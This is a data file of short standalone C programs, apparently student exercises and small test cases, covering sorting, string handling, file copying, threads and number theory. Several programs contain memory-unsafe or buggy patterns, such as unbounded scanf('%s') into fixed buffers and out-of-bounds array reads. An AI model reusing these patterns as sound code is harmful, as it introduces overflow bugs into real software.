    "#include <stdio.h>\n\nint a[] = { 7, 1, 9, 5, 6, 4, 1 };\nint tree[4 * 7];\nint init(int start, int end, int node) {\n if (start == end) return tree[node] = a[start];\n int mid = (start + end) / 2;\n return tree[node] = init(start, mid, node * 2) + init(mid + 1, end, node * 2 + 1);\n}\nint sum(int start, int end, int node, int left, int right) {\n if (left > end || right < start) return 0;\n if (left <= start && end <= right) return tree[node];\n int mid = (start + end) / 2;\n return sum(start, mid, node * 2, left, right) + sum(mid + 1, end, node * 2 + 1, left, right);\n}\nvoid update(int start, int end, int node, int index, int dif) {\n if (index < start || index > end) return;\n tree[node] += dif;\n if (start == end) return;\n int mid = (start + end) / 2;\n update(start, mid, node * 2, index, dif);\n update(mid + 1, end, node * 2 + 1, index, dif);\n}\nint main(void) {\n init(0, 7 - 1, 1);\n printf(\"0 ~ 6 Sum: %d\\n\", sum(0, 7 - 1, 1, 0, 6));\n printf(\"Modify elements of index 5 by +3\\n\");\n update(0, 7 - 1, 1, 5, 3);\n printf(\"3 ~ 6 Sum: %d\\n\", sum(0, 7 - 1, 1, 3, 6));\n return 0;\n}",
    "#include <stdio.h>\n#include <string.h>\n#include <stdlib.h>\n#include <time.h>\nint main() {\n    char name [20];\n    int r;\n    int in;\n    srand(time(((void*)0)));\n    r = rand() % 10;\n    printf(\"\u540d\u524d\u306f\uff1f 10\u30d0\u30a4\u30c8\u4ee5\u4e0b \");\n    scanf(\"%19s\", name);\n    printf(\"\u6570\u5b57\u3092\u5f53\u3066\u3066\u4e0b\u3055\u3044 (1\u6841) \");\n    scanf(\"%d\", &in);\n    if (in == r && strlen(name) <= 10) {\n        printf(\"\u5f53\u305f\u308a\u3067\u3059 %s \u3055\u3093 \\n\", name);\n    }\n    else if (in != r && strlen(name) <= 10) {\n        printf(\"\u30cf\u30ba\u30ec\u3067\u3059\u3002 %s\u3055\u3093 \\n\", name);\n    }\n    else {\n        printf(\"\u540d\u524d\u304c\u9577\u3059\u304e\u307e\u305b\u3093\u304b\uff1f\");\n    }\n    return 0;\n}",
    "#include <stdint.h>\n#include <stdio.h>\nint32_t sum(int32_t a, int32_t b) {\n    return a + b;\n}\nint32_t main() {\n    int32_t a = 0;\n    putchar('0' + sum(2, 3));\n    for (a=sum(2, 3) + 5; a + 1 - 1; a = a - 1) {\n        putchar('a');\n        putchar('\\n');\n    }\n    return 0;\n}",
    "#include <stdio.h>\nint main(void)\n{\n char* croWord[8] = { \"c=\", \"c-\", \"dz=\", \"d-\", \"lj\", \"nj\", \"s=\", \"z=\" };\n char s[101];\n int cnt = 0;\n int i;\n scanf(\"%s\", s);\n for (int i = 0; s[i] != ((void*)0); i++)\n {\n  if (s[i] == 'd' && s[i + 1] == 'z' && s[i + 2] == '=')\n  {\n   cnt++;\n   i += 2;\n   continue;\n  }\n  if (s[i] == '=' || s[i]== '-')\n   continue;\n  if(i!=0)\n   if (s[i] == 'j')\n    if (s[i - 1] == 'l' || s[i - 1] == 'n')\n     continue;\n  cnt++;\n }\n printf(\"%d\", cnt);\n return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main(int argc, char *argv[])\n{\n    char nom[20];\n    printf(\"Quel est votre nom ? \");\n    scanf(\"%s\", nom);\n    printf(\"Ah ! Vous vous appelez donc %s !\\n\\n\", nom);\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\nint main()\n{\n char szoveg[101];\n printf(\"Kerem a szoveget:\\n\");\n scanf(\"%s\", szoveg);\n int hossz=strlen(szoveg);\n printf(\"A szoveg hossza: %d.\\n\", hossz);\n char *megfelelo=(char*)malloc(sizeof(char)*(hossz+1));\n strcpy(megfelelo, szoveg);\n printf(\"A szoveg (megfelelo hosszon): %s\\n\", megfelelo);\n free(megfelelo);\n return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint isEven(const int);\nint isPrime(const int);\nint main() {\n   FILE * fPtrIn = ((void*)0);\n   int num = 0, success = 0;\n   fPtrIn = fopen(\"numbers.txt\", \"r\");\n   if(fPtrIn == ((void*)0))\n   {\n        printf(\"Unable to open file.\\n\");\n        printf(\"Please check whether file exists and you have read/write privilege.\\n\");\n        exit(1);\n   }\n   printf(\"File opened successfully. Reading integers from file. \\n\\n\");\n   success = fscanf(fPtrIn, \"%d\", &num);\n    do {\n       if (isPrime(num))\n           printf(\"Prime number found: %d\\n\", num);\n       else if (isEven(num))\n           printf(\"Even number found: %d\\n\", num);\n       else\n           printf(\"Odd number found: %d\\n\", num);\n      success = fscanf(fPtrIn, \"%d\", &num);\n    } while(success != -1);\n    fclose(fPtrIn);\n    return 0;\n}\nint isEven(const int num)\n{\n    return !(num & 1);\n}\nint isPrime(const int num)\n{\n    int i = 0;;\n    if (num < 0)\n        return 0;\n    for ( i=2; i<=num/2; i++ )\n    {\n        if (num % i == 0)\n        {\n            return 0;\n        }\n    }\n    return 1;\n}",
    "#include <stdio.h>\nint main(void) {\n  printf(\"input:\");\n  int i,s;\n  scanf(\"%d\",&i);\n  s=0;\n  while(i>0){\n    s+=i%10;\n    i/=10;\n  }\n  printf(\"the sum is %d\\n\",s);\n  return 0;\n}",
    "#include<stdio.h>\nvoid filter(int *A, unsigned int *plen, int f);\nint main(){\n        unsigned int len;\n    int f;\n    scanf(\"%2u\", &len);\n    int A[len];\n    for(int i = 0; i<len; i=i+1){\n        scanf(\"%d\", A+i);\n    }\n    scanf(\"%d\", &f);\n unsigned int *plen = &len;\n filter(A, plen, f);\n    printf(\"[\");\n    for (int i = 0; i<len; i+=1)\n        printf(\" %d\",A[i]);\n    printf(\" ]\\n\");\n}\nvoid filter(int *A, unsigned int *plen, int f) {\n for (int i = 0; i < (int) *plen;) {\n  if ( *(A + i) == f) {\n   *plen -= 1;\n   for (int y = i; y < (int) *plen; y++) {\n    *(A + y) = *(A + y + 1);\n   }\n  }\n  else i++;\n }\n}",
    "#include<stdio.h>\n#include<string.h>\nint main(int argc, char**argv) {\n  char str[100];\n  int palindrome = 1,i = 0,longueur;\n  printf(\"Entrez une chaine de caracteres : \");\n  scanf(\"%s\",str);\n  longueur = strlen(str);\n  while (i < (longueur/2)) {\n    if (str[i] != str[longueur - i - 1])\n      palindrome = 0;\n    i++;\n  }\n  if (palindrome)\n    printf(\"C'est un palindrome.\\n\");\n  else\n    printf(\"Ce n'est pas un palindrome.\\n\");\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <unistd.h>\n#include <stdint.h>\n#include <stdbool.h>\n\nunion sample\n{\n uint8_t buf[3];\n long number;\n};\n\nint main(int argc, char const *argv[])\n{\n if (argc != 2) {\n  fprintf((stderr), \"Usage: %s <samplecount>\\nGot:%d Wanted:%d\\n\", argv[0], argc,2);\n  exit(1);\n }\n union sample input;\n int samplecount = atoi(argv[1]);\n FILE *filter;\n if ((filter = fdopen(6, \"r\")) == ((void*)0))\n {\n  fprintf((stderr), \"fdopen failed\\n\");\n  exit(1);\n }\n size_t readNum =0;\n size_t len = 0;\n ssize_t bytes;\n char *line = ((void*)0);\n while ((bytes = getline(&line, &len, filter)) != -1) {\n  int f = atoi(line);\n  switch (readNum) {\n  case 0:\n   if (f != 10)\n   {\n    fprintf((stderr), \"wrong scaler\");\n    exit(1);\n   }\n   break;\n  case 1:\n   if (f != 23)\n   {\n    fprintf((stderr), \"wrong val0\");\n    exit(1);\n   }\n   break;\n  case 2:\n   if (f != 42)\n   {\n    fprintf((stderr), \"wrong val1\");\n    exit(1);\n   }\n   break;\n  case 3:\n   if (f != 666)\n   {\n    fprintf((stderr), \"wrong val2\");\n    exit(1);\n   }\n   break;\n  }\n  readNum++;\n }\n if (ferror(filter)) {\n  fprintf((stderr), \"ferror\");\n  exit(1);\n }\n free(line);\n fclose(filter);\n exit(0);\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nvoid toRoman(int nr){\n    int i=0;\n    char *rom[]={\"M\", \"CM\", \"D\", \"CD\", \"C\", \"XC\", \"L\", \"XL\", \"X\", \"IX\", \"V\", \"IV\", \"I\"};\n    int arab[14]={1000, 900, 500, 400, 100, 90, 50, 40, 10, 9, 5, 4, 1};\n    for(i=0; i<12; i++){\n        while(nr>=arab[i]){\n            nr-=arab[i];\n            printf(\"%s\", rom[i]);\n        }\n    }\n}\nint main()\n{\n    int nr;\n    printf(\"Numar in cifre arabe: \");\n    scanf(\"%d\", &nr);\n    toRoman(nr);\n    return 0;\n}",
    "#include <stdlib.h>\nint foo(bufp)\nchar *bufp;\n{\n    int x = 80;\n    return (*bufp++ = x ? 'a' : 'b');\n}\nint main()\n{\n  char x;\n  if (foo (&x) != 'a')\n    abort ();\n  exit (0);\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <ctype.h>\n\n\nint isEqual(char c1, char c2, char c3, char c4);\nint isLetter(char c);\nint isValidCode(char c1, char c2, char c3, char c4);\nint main(void)\n{\n  char c1, c2, c3, c4;\n  scanf(\"%c%c %c%c\", &c1, &c2, &c3, &c4);\n  if(isValidCode(c1, c2, c3, c4))\n  {\n    if(isEqual(c1, c2, c3, c4))\n      printf(\"IGUAIS\");\n    else\n      printf(\"DIFERENTES\");\n  }\n  else\n    printf(\"Invalido\");\n  return 0;\n}\nint isLetter(char c)\n{\n  return ((c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z')) ? 1 : 0;\n}\nint isValidCode(char c1, char c2, char c3, char c4)\n{\n  return (((0 ? isdigit(c1) : ((unsigned)(c1)-'0') < 10) || isLetter(c1)) && ((0 ? isdigit(c2) : ((unsigned)(c2)-'0') < 10) || isLetter(c2)) && ((0 ? isdigit(c3) : ((unsigned)(c3)-'0') < 10) || isLetter(c3)) && ((0 ? isdigit(c4) : ((unsigned)(c4)-'0') < 10) || isLetter(c4))) ? 1 : 0;\n}\nint isEqual(char c1, char c2, char c3, char c4)\n{\n  if(isLetter(c1) && isLetter(c2) && isLetter(c3) && isLetter(c4))\n  {\n    if((toupper(c1) == toupper(c3)) && (toupper(c2) == toupper(c4)))\n      return 1;\n  }\n  else if(isLetter(c1) && isLetter(c3))\n    return ((toupper(c1) == toupper(c3)) && (c2 == c4)) ? 1 : 0;\n  else\n    return ((toupper(c2) == toupper(c4)) && (c1 == c3)) ? 1 : 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main(){\n  char * in, *out, c;\n  FILE *fp1, *fp2;\n  if((in = malloc(sizeof(char)*4096)) == ((void*)0)) return 1;\n  if((out = malloc(sizeof(char)*4096)) == ((void*)0)) return 1;\n  printf(\"Input file name:\");\n  scanf(\"%s\",in);\n  if((fp1 = fopen(in,\"r\")) == ((void*)0)){\n    printf(\"Cannot open file \\\"%s\\\" for reading. Program terminated.\\n\",in);\n    return 1;\n  }\n  printf(\"Output file name:\");\n  scanf(\"%s\",out);\n  if((fp2 = fopen(out,\"w\")) == ((void*)0)){\n    printf(\"Failed to open/create file \\\"%s\\\" for writing. Program terminated.\\n\",out);\n    fclose(fp1);\n    return 1;\n  }\n  printf(\"%s => %s\\nMoving in progress...\\n\",in,out);\n  while((c=fgetc(fp1)) != (-1)) fputc(c,fp2);\n  fclose(fp1);\n  fclose(fp2);\n  printf(\"Done.\\n\");\n  free(in);\n  free(out);\n  return 0;\n}",
    "#include <stdio.h>\n#include <string.h>\n\nint main(){\n char str[20];\n int num = 0, i;\n printf(\"Please enter a string > \");\n fgets(str, 20, (stdin));\n for (i = 0; str[i] != '\\0'; i++) {\n  switch(str[i]){\n   case 'a':\n    num=num+1;\n    break;\n   case 'e':\n    num=num+1;\n    break;\n   case 'i':\n    num=num+1;\n    break;\n   case 'o':\n    num=num+1;\n    break;\n   case 'u':\n    num=num+1;\n    break;\n   default:\n    num=num;\n   }}\n printf(\"The number of syllables is %d.\\n\", num);\n return 0;\n }",
    "#include <stdint.h>\n#include <stdio.h>\n#include <stdlib.h>\nint main() {\n    int16_t a, b, c, m;\n    while (scanf(\"%d %d %d\", &a, &b, &c) != (-1)) {\n        m = (a + b + abs(a - b)) / 2;\n        m = (m + c + abs(m - c)) / 2;\n        printf(\"%d eh o maior\\n\", m);\n    }\n}",
    "#include <stdio.h>\nchar* a[105] = {\"0\", \"1\", \"3\", \"6\", \"10\", \"15\", \"21\", \"28\",\n                \"36\", \"45\", \"55\", \"66\", \"78\", \"91\", \"105\", \"120\",\n                \"136\", \"153\", \"171\", \"190\", \"210\", \"231\", \"253\", \"276\",\n                \"300\", \"325\", \"351\", \"378\", \"406\", \"435\", \"465\", \"496\",\n                \"528\", \"561\", \"595\", \"630\", \"666\", \"703\", \"741\", \"780\",\n                \"820\", \"861\", \"903\", \"946\", \"990\", \"1035\", \"1081\", \"1128\",\n                \"1176\", \"1225\", \"1275\", \"1326\", \"1378\", \"1431\", \"1485\", \"1540\",\n                \"1596\", \"1653\", \"1711\", \"1770\", \"1830\", \"1891\", \"1953\", \"2016\",\n                \"2080\", \"2145\", \"2211\", \"2278\", \"2346\", \"2415\", \"2485\", \"2556\",\n                \"2628\", \"2701\", \"2775\", \"2850\", \"2926\", \"3003\", \"3081\", \"3160\",\n                \"3240\", \"3321\", \"3403\", \"3486\", \"3570\", \"3655\", \"3741\", \"3828\",\n                \"3916\", \"4005\", \"4095\", \"4186\", \"4278\", \"4371\", \"4465\", \"4560\",\n                \"4656\", \"4753\", \"4851\", \"4950\", \"5050\"};\nint main() {\n  int n;\n  scanf(\"%d\", &n);\n  printf(\"%s\\n\", a[n]);\n  return 0;\n}",
    "#include<stdio.h>\n#include<stdlib.h>\nint main()\n{\n    int N,i,k,j;\n    int *p;\n    printf(\"Enter the limit of array: \");\n    scanf(\"%d\",&N);\n    p=(int*)malloc(N*sizeof(int));\n    for(i=0;i<N;i++)\n    {\n        scanf(\"%d\",p+i);\n    }\n    for(i=0;i<N-1;i++)\n    {\n        for(j=i+1;j<N;j++)\n        {\n            if(*(p+j)==*(p+i))\n            {\n                for(k=j;k<N;k++)\n                    *(p+k)=*(p+k+1);\n                N--;\n                j--;\n            }\n        }\n    }\n    p=(int*)realloc(p,N*sizeof(int));\n    for(i=0;i<N;i++)\n    {\n        printf(\"%d \",*(p+i));\n    }\n}",
    "#include <stdio.h>\nint tmax(int n);\nint tmin(int n);\nint main() {\n    int n;\n    scanf(\"%d\", &n);\n    printf(\"%d %d\\n\", tmax(n), tmin(n));\n    return 0;\n}\nint tmax(int n) {\n    if (n == 2) {\n        return 1;\n    }\n    return tmax(n / 2) * 2 + n - 1;\n}\nint tmin(int n) {\n    if (n == 2) {\n        return 1;\n    }\n    return tmin(n / 2) * 2 + n / 2;\n}",
    "int main( void )\n{\n char* char_ptr;\n int* int_ptr;\n int int_array[2];\n char_ptr = (char*) int_array;\n int_ptr = (int*)(char_ptr + 1);\n *int_ptr = 1;\n return 0;\n}",
    "#include <fcntl.h>\n#include <unistd.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include <sys/stat.h>\n#include <sys/types.h>\n#include <err.h>\n#include <stdint.h>\n\nint main(int argc, char* argv[])\n{\n if (argc == 1)\n {\n  err(1, \"Expected arguments.\\n\");\n }\n int i;\n for (i = 1; i < argc; i++)\n {\n  int fd = open(argv[i], (0x04000000));\n  if (fd == -1)\n  {\n   err(2, \"Error while opening files.\\n\");\n  }\n  char buf[4096];\n  ssize_t readsize;\n  while ((readsize = read(fd, &buf, sizeof(buf))) > 0)\n  {\n   if (write(1, &buf, readsize) != readsize)\n   {\n    close(fd);\n    err(3, \"Error while writing to files.\\n\");\n   }\n  }\n  close(fd);\n  printf(\"\\n\");\n }\n exit(0);\n}",
    "#include <stdio.h>\nint main()\n{\n    int m, n;\n    int i, k=1;\n    scanf(\"%d%d\", &n, &m);\n    if(n==0 || m==0){\n        k = 0;\n    }\n    else if(n>=m){\n        for(i=n;i>=(n-m+1);i--){\n            k = k * i;\n        }\n        for(i=1;i<=m;i++){\n            k=k/i;\n        }\n    }\n    else{\n        k = 1;\n    }\n    printf(\"%d\", k);\n    return 0;\n}",
    "#include <stdio.h>\nint main(){\n    int num, m2=0, m3=0;\n    printf(\"Digite 10 n\u00fameros inteiros:\\n\");\n    for(int i=1; i<=10; i++){\n        printf(\"N\u00famero %i: \",i);\n        scanf(\"%i\",&num);\n        if(num % 2 == 0){\n            m2++;\n        }\n        if(num % 3 == 0){\n            m3++;\n        }\n    }\n    printf(\"Voc\u00ea informou %i m\u00faltiplos de 2 e %i m\u00faltiplos de 3.\", m2, m3);\n}",
    "#include <stdio.h>\n#include <pthread.h>\n#include <semaphore.h>\nvoid myfunc1(void *ptr);\nvoid myfunc2(void *ptr);\nchar buf[24];\nsem_t mutex;\nint main(int argc, char **argv)\n{\n pthread_t thread1;\n pthread_t thread2;\n char *msg1 = \"Thread 1\";\n char *msg2 = \"Thread 2\";\n sem_init(&mutex, 0, 1);\n pthread_create (&thread1, ((void*)0), (void *) &myfunc1, (void *) msg1);\n pthread_create (&thread2, ((void*)0), (void *) &myfunc2, (void *) msg2);\n pthread_join(thread1, ((void*)0));\n pthread_join(thread2, ((void*)0));\n sem_destroy(&mutex);\n return 0;\n}\nvoid myfunc1(void *ptr)\n{\n char *msg = (char *)ptr;\n printf(\"%s\\n\",msg);\n sem_wait(&mutex);\n sprintf(buf, \"%s\", \"Hello there!\");\n sem_post(&mutex);\n pthread_exit(0);\n}\nvoid myfunc2(void *ptr)\n{\n char *msg = (char *)ptr;\n printf(\"%s\\n\", msg);\n sem_wait(&mutex);\n printf(\"%s\\n\", buf);\n sem_post(&mutex);\n pthread_exit(0);\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n\n\nint *createMappedMatrix(int num_rows, int num_cols){\n    int *matrix = (int *)malloc(num_cols * num_rows * sizeof(int));\n    for(int i = 0; i < num_rows; i ++){\n        for(int j = 0; j < num_cols; j++){\n            matrix[j + 6 * i] = 5;\n        }\n    }\n    return matrix;\n}\nvoid printMappedMatrix(int *matrix, int num_rows, int num_cols){\n    for(int i = 0; i < num_rows; i++){\n        printf(\"[ \");\n        for(int j = 0; j < num_cols; j++){\n            printf(\"%d \", matrix[j + 6 * i]);\n        }\n        printf(\"]\\n\");\n    }\n}\nint main(void){\nint *matrix = createMappedMatrix(5, 6);\nprintMappedMatrix(matrix, 5, 6);\n    return 0;\n}",
    "#include <time.h>\n#include <errno.h>\n#include <stdio.h>\n#include <stdlib.h>\nint main() {\n time_t t = time(((void*)0));\n printf(\"Seconds since 1/1/1970 00:00:00 UTC: %li\\n\", t);\n return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main()\n{\n    int n = 1, fat, i;\n    for (i = 1; i <= 10; i++)\n    {\n        n = i;\n    }\n    for(fat = 1; n <=10; n = n + 1)\n    {\n        fat = fat * n;\n        printf(\"O fatorial de %d \u00e9 = %d\\n\", n, fat);\n    }\n    system(\"PAUSE\");\n}",
    "#include <stdio.h>\nint main(int argc, char** argv){\n    if(argc < 3) return 1;\n    FILE* in1 = fopen(argv[1], \"r\");\n    FILE* in2 = fopen(argv[2], \"r\");\n    int c1, c2, count=0;\n    while((c1=fgetc(in1)) != (-1)){\n        if((c2=fgetc(in2)) == (-1))\n            break;\n        if((c1 >> 4) != (c2 >> 4)) count++;\n        if((c1 & 0xF) != (c2 & 0xF)) count++;\n    }\n    fclose(in1);\n    fclose(in2);\n    printf(\"Liczba rozniacych sie blokow 4-bitowych to %d\\n\",count);\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <time.h>\nvoid mergeSort(int array[], size_t length);\nvoid sortSubArray(int array[], size_t low, size_t high);\nvoid merge(int array[], size_t left, size_t middle1,\n   size_t middle2, size_t right);\nvoid displayElements(int array[], size_t length);\nvoid displaySubArray(int array[], size_t left, size_t right);\nint main(void)\n{\n   int array[10];\n   srand(time(((void*)0)));\n   for (size_t i = 0; i < 10; i++) {\n      array[i] = rand() % 90 + 10;\n   }\n   puts(\"Unsorted array:\");\n   displayElements(array, 10);\n   puts(\"\\n\");\n   mergeSort(array, 10);\n   puts(\"Sorted array:\");\n   displayElements(array, 10);\n}\nvoid mergeSort(int array[], size_t length)\n{\n   sortSubArray(array, 0, length - 1);\n}\nvoid sortSubArray(int array[], size_t low, size_t high)\n{\n   if ((high - low) >= 1) {\n      size_t middle1 = (low + high) / 2;\n      size_t middle2 = middle1 + 1;\n      printf(\"%s\", \"split:   \");\n      displaySubArray(array, low, high);\n      printf(\"%s\", \"\\n         \");\n      displaySubArray(array, low, middle1);\n      printf(\"%s\", \"\\n         \");\n      displaySubArray(array, middle2, high);\n      puts(\"\\n\");\n      sortSubArray(array, low, middle1);\n      sortSubArray(array, middle2, high);\n      merge(array, low, middle1, middle2, high);\n   }\n}\nvoid merge(int array[], size_t left, size_t middle1,\n   size_t middle2, size_t right)\n{\n   size_t leftIndex = left;\n   size_t rightIndex = middle2;\n   size_t combinedIndex = left;\n   int tempArray[10];\n   printf(\"%s\", \"merge:   \");\n   displaySubArray(array, left, middle1);\n   printf(\"%s\", \"\\n         \");\n   displaySubArray(array, middle2, right);\n   puts(\"\");\n   while (leftIndex <= middle1 && rightIndex <= right) {\n      if (array[leftIndex] <= array[rightIndex]) {\n         tempArray[combinedIndex++] = array[leftIndex++];\n      }\n      else {\n         tempArray[combinedIndex++] = array[rightIndex++];\n      }\n   }\n   if (leftIndex == middle2) {\n      while (rightIndex <= right) {\n         tempArray[combinedIndex++] = array[rightIndex++];\n      }\n   }\n   else {\n      while (leftIndex <= middle1) {\n         tempArray[combinedIndex++] = array[leftIndex++];\n      }\n   }\n   for (size_t i = left; i <= right; i++) {\n      array[i] = tempArray[i];\n   }\n   printf(\"%s\", \"         \");\n   displaySubArray(array, left, right);\n   puts(\"\\n\");\n}\nvoid displayElements(int array[], size_t length)\n{\n   displaySubArray(array, 0, length - 1);\n}\nvoid displaySubArray(int array[], size_t left, size_t right)\n{\n   for (size_t i = 0; i < left; i++) {\n      printf(\"%s\", \"   \");\n   }\n   for (size_t i = left; i <= right; i++) {\n      printf(\" %d\", array[i]);\n   }\n}",
    "#include <stdio.h>\nvoid printArray(int array[], int size) {\n  for (int i = 0; i < size; i++) {\n    printf(\"%d \", array[i]);\n  }\n  printf(\"\\n\");\n}\nvoid insertionSort(int array[], int size) {\n  for (int step = 1; step < size; step++) {\n    int key = array[step];\n    int j = step - 1;\n    while (key < array[j] && j >= 0) {\n      array[j + 1] = array[j];\n      --j;\n    }\n    array[j + 1] = key;\n  }\n}\nint main() {\n  int data[] = {9, 5, 1, 4, 3};\n  int size = sizeof(data) / sizeof(data[0]);\n  insertionSort(data, size);\n  printf(\"Sorted array in ascending order:\\n\");\n  printArray(data, size);\n}",
    "#include <stdio.h>\n\n\nvoid ProcessArgs(int argc, char *argv[], int *output)\n{\n  int i = 0;\n  while(argc > 1)\n  {\n    --argc;\n    if(argv[argc][0] == '-')\n    {\n      i = 1;\n      while(argv[argc][i] != '\\0')\n      {\n        if(argv[argc][i] == 'o')\n        {\n          *output = 8;\n        }\n        else if(argv[argc][i] == 'x')\n        {\n          *output = 16;\n        }\n        else\n        {\n        }\n      ++i;\n      }\n    }\n  }\n}\nint can_print(int ch)\n{\n  char *printable = \"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890 !\\\"#%&'()*+,-./:;<=>?[\\\\]^_{|}~\\t\\f\\v\\r\\n\";\n  char *s;\n  int found = 0;\n  for(s = printable; !found && *s; s++)\n  {\n    if(*s == ch)\n    {\n      found = 1;\n    }\n  }\n  return found;\n}\nint main(int argc, char *argv[])\n{\n  int split = 80;\n  int output = 16;\n  int ch;\n  int textrun = 0;\n  int binaryrun = 0;\n  char *format;\n  int width = 0;\n  ProcessArgs(argc, argv, &output);\n  if(output == 16)\n  {\n    format = \"%02X \";\n    width = 4;\n  }\n  else\n  {\n    format = \"%3o \";\n    width = 4;\n  }\n  while((ch = getchar()) != (-1))\n  {\n    if(can_print(ch))\n    {\n      if(binaryrun > 0)\n      {\n        putchar('\\n');\n        binaryrun = 0;\n        textrun = 0;\n      }\n      putchar(ch);\n      ++textrun;\n      if(ch == '\\n')\n      {\n        textrun = 0;\n      }\n      if(textrun == split)\n      {\n        putchar('\\n');\n        textrun = 0;\n      }\n    }\n    else\n    {\n      if(textrun > 0 || binaryrun + width >= split)\n      {\n        printf(\"\\nBinary stream: \");\n        textrun = 0;\n        binaryrun = 15;\n      }\n      printf(format, ch);\n      binaryrun += width;\n    }\n  }\n  putchar('\\n');\n  return 0;\n}",
    "#include <stdio.h>\nvoid extended_euclidean_algorithm(int value, int divisor, int *x, int *y)\n{\n if (value == 0) {\n  *x = 0;\n  *y = 1;\n  return;\n }\n int x1, y1;\n extended_euclidean_algorithm(divisor % value, value, &x1, &y1);\n *x = y1 - (divisor / value) * x1;\n *y = x1;\n return;\n}\nint compute_inverse(int value, int divisor)\n{\n int x, y;\n extended_euclidean_algorithm(value, divisor, &x, &y);\n return (x % divisor + divisor) % divisor;\n}\nint chinese_remainder(int divisors[], int remainders[], int count)\n{\n int N = 1, result = 0;\n for (int i = 0; i < count; i++)\n  N = N*divisors[i];\n for (int i = 0; i < count; i++) {\n  int Ni = N / divisors[i];\n  result += remainders[i] * Ni * compute_inverse(Ni, divisors[i]);\n }\n return (result % N);\n}\nint main(void)\n{\n int N;\n scanf(\"%d\", &N);\n int divisors[N], remainders[N];\n for (int i = 0; i < N; i++)\n  scanf(\"%d %d\", &divisors[i], &remainders[i]);\n printf(\"%d\", chinese_remainder(divisors, remainders, N));\n return 0;\n}",
    "#include<stdio.h>\n#include<string.h>\nint main()\n{\n    char S1[10000],S2[10000];\n    int i,j;\n    scanf(\"%s\",&S1);\n    scanf(\"%s\",&S2);\n    int length1 = strlen(S1);\n    int length2 = strlen(S2);\n    int count1 = 0, count2 = 0;\n    for(i=0;i<length1;i++)\n    {\n        for(j=0;j<length2;j++)\n        {\n            if(S1[i] == S2[j])\n            {\n                S1[i] = '-';\n                S2[j] = '-';\n            }\n        }\n    }\n    for(i=0;i<length1;i++)\n    {\n        if(S1[i] != '-')\n        {\n            count1++;\n        }\n    }\n    for(i=0;i<length2;i++)\n    {\n        if(S2[i] != '-')\n        {\n            count2++;\n        }\n    }\n    printf(\"%d\",count1+count2);\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main()\n{\n    int n,i=1,f=1;\n    printf(\"Enter any number: \");\n    scanf(\"%d\",&n);\n    while (i<=n)\n    {\n        f*=i;\n        i++;\n    }\n    printf(\"\\nFactorial Value: %d.\\n\",f);\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdint.h>\n\nint main() {\n    float a = 1.72;\n    float b = 2.73;\n    float c = 0.0;\n    int d = 2;\n    int e = 3;\n    int f = 0;\n    c = a + b;\n    printf(\"a + b = %.3f\\n\", c);\n    c = a - b;\n    printf(\"a - b = %.3f\\n\", c);\n    c = a * b;\n    printf(\"a * b = %.3f\\n\", c);\n    f = d + e;\n    printf(\"d + e = %d\\n\", f);\n    f = d - e;\n    printf(\"d - e = %d\\n\", f);\n    f = d * e;\n    printf(\"d * e = %d\\n\", f);\n    return 0;\n}",
    "#include <fcntl.h>\n#include <stdlib.h>\n#include <unistd.h>\n#include <sys/stat.h>\n#include <sys/types.h>\nint main(void) {\n  char buf[128];\n  int fd, ret;\n  unsigned int i;\n  fd = open(\"/dev/zero\", (0x04000000));\n  if (fd < 0)\n    return 1;\n  ret = read(fd, buf, sizeof(buf));\n  if (ret < 0)\n    return 2;\n  for (i = 0; i < (sizeof(buf) / sizeof(buf[0])); i++) {\n    if (buf[i] != 0)\n      return 3;\n  }\n  ret = close(fd);\n  if (ret < 0)\n    return 4;\n  return 0;\n}",
    "#include <stdio.h>\nint main(){\n float distancia, tempo, vm;\n printf(\"--------------------------\");\n printf(\"\\nCALCULADORA VELOCIDADE MEDIA\");\n printf(\"\\n--------------------------\");\n printf(\"\\nInsira a distancia(km):\");\n scanf(\"%f\",&distancia);\n printf(\"Entre com o tempo(hs):\");\n scanf(\"%f\",&tempo);\n vm=distancia/tempo;\n printf(\"A velocidade media e de: %.2f km/hs\",vm);\n return 0;\n}",
    "#include <stdio.h>\nvoid printArr(char arr[], int k)\n{\n    int i;\n    for (i=0; i<k; i++)\n        printf(\"%c\", arr[i]);\n    printf(\"\\n\");\n}\nvoid printSeq(int n, int m, int len, char arr[])\n{\n    if(len == m)\n        printArr(arr, m);\n    char last_element = len==0?'a'-1:arr[len-1];\n    if(last_element >= 'a'-1+n)\n        return;\n    char i;\n    for(i = last_element+1; i<='a'-1+n; i++)\n    {\n        arr[len] = i;\n        printSeq(n, m, len+1, arr);\n    }\n}\nint main()\n{\n    int k, n;\n    scanf(\"%d%d\", &n, &k);\n    char arr[k];\n    printSeq(n, k, 0, arr);\n    return 0;\n}",
    "#include <stdio.h>\nint main() {\n  int a,b,total;\n  float x;\n  printf(\"Enter the subject 1 mark:\");\n  scanf(\"%d\",&a);\n  printf(\"Enter the subject 2 mark :\");\n  scanf(\"%d\",&b);\n  total=a+b;\n  x=total/2.0;\n  printf(\"Average mark is %.1f\",x);\n  return 0;\n}",
    "int main() {\n    int* p = 0;\n    int a = 1;\n    if (a != 1 && *p) {\n        return a;\n    }\n    return 100;\n}",
